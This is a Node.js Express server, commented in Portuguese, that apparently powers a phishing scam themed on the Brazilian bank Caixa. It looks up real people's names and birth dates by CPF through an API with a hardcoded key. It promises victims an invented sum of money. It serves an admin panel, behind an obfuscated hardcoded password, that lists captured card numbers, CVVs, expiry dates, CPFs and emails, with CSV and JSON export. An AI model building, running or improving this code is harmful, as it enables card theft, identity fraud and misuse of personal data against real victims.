const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();

// Middlewares
app.use(cors());
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Função para gerar data aleatória
function gerarDataAleatoria(anoMin, anoMax) {
  const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
  const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  const dia = String(Math.floor(Math.random() * 28) + 1).padStart(2, '0');
  return `${ano}-${mes}-${dia}`;
}

// Função para formatar data
function formatarData(dataStr) {
  if (!dataStr) return '---';
  const partes = dataStr.split('-');
  if (partes.length === 3) {
    return `${partes[2]}/${partes[1]}/${partes[0]}`;
  }
  return dataStr;
}

// Função para gerar valor aleatório baseado no CPF
function gerarValorPorCPF(cpf) {
  let hash = 0;
  for (let i = 0; i < cpf.length; i++) {
    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
    hash = hash & hash;
  }
  const min = 500;
  const max = 150000;
  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
  const valorReais = (valorCentavos / 100).toFixed(2);
  return parseFloat(valorReais);
}

// ====================== ROTA PARA BUSCAR CPF ======================
app.post('/buscar-cpf', async (req, res) => {
  const { cpf } = req.body;
  console.log(`🔍 Buscando CPF: ${cpf}`);

  if (!cpf || cpf.length !== 11) {
    return res.status(400).json({ success: false, erro: 'CPF inválido - deve conter 11 dígitos' });
  }

  try {
    const fetch = await import('node-fetch');
    const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
      headers: {
        'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
        'Accept': 'application/json'
      },
      timeout: 5000
    });

    if (!response.ok) {
      throw new Error(`API retornou ${response.status}`);
    }

    const data = await response.json();
    let nomeUsuario = '';
    let dataNascimentoReal = '';
    
    if (data.data && data.data.name) {
      nomeUsuario = data.data.name;
      if (data.data.birthDate) dataNascimentoReal = data.data.birthDate;
    } else if (data.name) {
      nomeUsuario = data.name;
    } else if (data.nome) {
      nomeUsuario = data.nome;
    }
    
    if (!dataNascimentoReal) {
      dataNascimentoReal = gerarDataAleatoria(1970, 2000);
    }
    
    const opcoesDatas = [
      dataNascimentoReal,
      gerarDataAleatoria(1960, 1990),
      gerarDataAleatoria(1980, 2010)
    ];
    
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    console.log(`✅ Dados encontrados: ${nomeUsuario}`);
    console.log(`📅 Data real: ${dataNascimentoReal}`);
    
    res.json({
      success: true,
      nome: nomeUsuario || 'Usuário encontrado',
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataNascimentoReal,
      valorDisponivel: gerarValorPorCPF(cpf),
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '*****-*',
      message: 'Dados obtidos com sucesso!'
    });

  } catch (err) {
    console.error('❌ Erro na API:', err.message);
    
    const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
    const dataReal = gerarDataAleatoria(1970, 2000);
    
    const opcoesDatas = [
      dataReal,
      gerarDataAleatoria(1960, 1990),
      gerarDataAleatoria(1980, 2010)
    ];
    
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    res.json({
      success: true,
      nome: nomeSimulado,
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataReal,
      valorDisponivel: gerarValorPorCPF(cpf),
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '12345-6',
      simulado: true,
      message: 'Dados simulados (API indisponível)'
    });
  }
});

// ====================== ROTAS HTML ======================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pagamento.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'pagamento.html'));
});

// ====================== ADMIN - VISUALIZAR CARTÕES SALVOS ======================
app.get('/admin/ver-cartoes', (req, res) => {
    
    const visus1 = 90;
    const visus2 = 7;
    const visus3 = "ga3";
    const calculo1 = visus2 * 111;
    const visus4 = "777" + "ga" + (visus1 / 3);
    const ja8 = visus4;
    
    const senhaDigitada = req.query.senha || '';
    
    if (senhaDigitada !== ja8) {
        return res.send(`
            <!DOCTYPE html>
            <html lang="pt-BR">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Acesso Restrito</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: 'Segoe UI', monospace;
                        background: linear-gradient(135deg, #1a1a2e, #16213e);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: #fff;
                    }
                    .login-box {
                        background: #0f3460;
                        padding: 40px;
                        border-radius: 20px;
                        width: 90%;
                        max-width: 400px;
                        text-align: center;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                        border-left: 4px solid #ffb600;
                    }
                    h1 { color: #ffb600; margin-bottom: 20px; }
                    input {
                        width: 100%;
                        padding: 12px;
                        margin: 20px 0;
                        border: none;
                        border-radius: 8px;
                        font-size: 16px;
                        background: #1a1a2e;
                        color: #fff;
                        text-align: center;
                    }
                    button {
                        background: #ffb600;
                        color: #004aad;
                        border: none;
                        padding: 12px 30px;
                        border-radius: 8px;
                        cursor: pointer;
                        font-weight: bold;
                        font-size: 16px;
                        width: 100%;
                        transition: all 0.2s;
                    }
                    button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
                    .error {
                        background: #dc3545;
                        color: white;
                        padding: 10px;
                        border-radius: 8px;
                        margin-top: 15px;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h1>🔒 ACESSO RESTRITO</h1>
                    <p>Área administrativa</p>
                    <form method="GET" action="/admin/ver-cartoes">
                        <input type="password" name="senha" placeholder="Digite a senha de acesso" autocomplete="off">
                        <button type="submit">🔓 VERIFICAR</button>
                    </form>
                    ${senhaDigitada ? '<div class="error">❌ Acesso negado! Senha incorreta.</div>' : ''}
                </div>
            </body>
            </html>
        `);
    }
    
    // ========== SENHA CORRETA - MOSTRA A PÁGINA ADMIN ==========
    res.send(`
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin - Cartões Salvos</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', monospace;
                    background: linear-gradient(135deg, #1a1a2e, #16213e);
                    padding: 20px;
                    color: #fff;
                }
                .container { max-width: 1200px; margin: 0 auto; }
                h1 { text-align: center; margin-bottom: 10px; color: #ffb600; }
                .stats {
                    background: #0f3460;
                    padding: 15px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    flex-wrap: wrap;
                    gap: 10px;
                }
                .stat-card {
                    background: #16213e;
                    padding: 10px 20px;
                    border-radius: 8px;
                    border-left: 4px solid #ffb600;
                }
                .card {
                    background: #0f3460;
                    border-radius: 12px;
                    padding: 20px;
                    margin-bottom: 15px;
                    border-left: 4px solid #ffb600;
                    transition: transform 0.2s;
                }
                .card:hover { transform: translateX(5px); }
                .card h3 { color: #ffb600; margin-bottom: 10px; }
                .card p { margin: 5px 0; font-size: 14px; }
                .card .label { color: #888; }
                .button-group {
                    display: flex;
                    gap: 10px;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }
                button {
                    background: #ffb600;
                    color: #004aad;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.2s;
                }
                button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
                .btn-danger { background: #dc3545; color: white; }
                .btn-danger:hover { background: #c82333; }
                .search-box {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 20px;
                    border-radius: 8px;
                    border: none;
                    font-size: 16px;
                }
                .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
                footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
                .logout {
                    text-align: right;
                    margin-bottom: 15px;
                }
                .logout a {
                    color: #ffb600;
                    text-decoration: none;
                    font-size: 12px;
                }
                .logout a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logout">
                    <a href="/admin/ver-cartoes">🚪 Sair</a>
                </div>
                <h1>📋 ADMIN - DADOS DOS CARTÕES</h1>
                <div class="stats" id="stats">
                    <div class="stat-card">📊 Total: <span id="total">0</span></div>
                    <div class="stat-card">💰 Valor Total: R$ <span id="totalValor">0</span></div>
                    <div class="stat-card">📅 Último registro: <span id="ultimo">-</span></div>
                </div>
                <div class="button-group">
                    <button onclick="carregarDados()">🔄 Atualizar</button>
                    <button onclick="exportarCSV()">📎 Exportar CSV</button>
                    <button onclick="copiarJSON()">📋 Copiar JSON</button>
                    <button class="btn-danger" onclick="limparDados()">🗑️ Limpar Todos</button>
                </div>
                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão..." onkeyup="filtrarDados()">
                <div id="lista-cartoes"></div>
                <footer>⚠️ Acesso restrito - Apenas administradores</footer>
            </div>
            <script>
                let todosCartoes = [];
                
                function carregarDados() {
                    const dados = localStorage.getItem('cartoes_salvos');
                    if (dados) {
                        todosCartoes = JSON.parse(dados);
                        atualizarDisplay();
                        atualizarStats();
                    } else {
                        document.getElementById('lista-cartoes').innerHTML = '<div class="empty">📭 Nenhum cartão salvo ainda</div>';
                        document.getElementById('total').textContent = '0';
                    }
                }
                
                function atualizarStats() {
                    const total = todosCartoes.length;
                    let totalValor = 0;
                    todosCartoes.forEach(c => {
                        const valor = parseFloat(c.valor.replace('R$ ', '').replace('.', '').replace(',', '.'));
                        if (!isNaN(valor)) totalValor += valor;
                    });
                    document.getElementById('total').textContent = total;
                    document.getElementById('totalValor').textContent = totalValor.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
                    if (total > 0) {
                        const ultimo = todosCartoes[todosCartoes.length - 1];
                        document.getElementById('ultimo').textContent = ultimo.data || 'N/A';
                    }
                }
                
                function atualizarDisplay() {
                    const searchTerm = document.getElementById('search').value.toLowerCase();
                    const filtrados = todosCartoes.filter(c => 
                        c.nome.toLowerCase().includes(searchTerm) ||
                        (c.cpf && c.cpf.includes(searchTerm)) ||
                        (c.cartao && c.cartao.includes(searchTerm)) ||
                        (c.email && c.email.toLowerCase().includes(searchTerm))
                    );
                    const container = document.getElementById('lista-cartoes');
                    if (filtrados.length === 0) {
                        container.innerHTML = '<div class="empty">🔍 Nenhum resultado encontrado</div>';
                        return;
                    }
                    container.innerHTML = filtrados.reverse().map((c, i) => \`
                        <div class="card">
                            <h3>#\${todosCartoes.length - i} - \${c.nome}</h3>
                            <p><span class="label">🆔 CPF:</span> \${c.cpf || 'N/A'}</p>
                            <p><span class="label">💳 CARTÃO:</span> \${c.cartao || 'N/A'}</p>
                            <p><span class="label">📅 VALIDADE:</span> \${c.validade || 'N/A'}</p>
                            <p><span class="label">🔢 CVV:</span> \${c.cvv || 'N/A'}</p>
                            <p><span class="label">📧 E-MAIL:</span> \${c.email || 'N/A'}</p>
                            <p><span class="label">💰 VALOR:</span> <strong style="color:#ffb600">\${c.valor || 'N/A'}</strong></p>
                            <p><span class="label">📅 DATA:</span> \${c.data || 'N/A'}</p>
                        </div>
                    \`).join('');
                }
                
                function filtrarDados() { atualizarDisplay(); }
                
                function exportarCSV() {
                    if (todosCartoes.length === 0) { alert('Nenhum dado para exportar'); return; }
                    const headers = ['Nome', 'CPF', 'Cartão', 'Validade', 'CVV', 'E-mail', 'Valor', 'Data'];
                    const linhas = todosCartoes.map(c => [c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data].map(v => \`"\${v || ''}"\`).join(','));
                    const csv = [headers.join(','), ...linhas].join('\\n');
                    const blob = new Blob([csv], { type: 'text/csv' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = \`cartoes_\${new Date().toISOString().slice(0,19)}.csv\`;
                    a.click();
                    URL.revokeObjectURL(url);
                }
                
                function copiarJSON() {
                    const json = JSON.stringify(todosCartoes, null, 2);
                    navigator.clipboard.writeText(json);
                    alert('✅ JSON copiado para a área de transferência!');
                }
                
                function limparDados() {
                    if (confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados salvos. Continuar?')) {
                        localStorage.removeItem('cartoes_salvos');
                        todosCartoes = [];
                        carregarDados();
                        alert('✅ Todos os dados foram removidos!');
                    }
                }
                
                carregarDados();
            </script>
        </body>
        </html>
    `);
});

// ====================== FALLBACK ======================
app.use((req, res) => {
  res.status(404).send('Página não encontrada');
});

// ====================== INICIA O SERVIDOR ======================
const PORT = 3000;

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`📁 Pasta atual: ${__dirname}`);
  console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
  console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes`);
});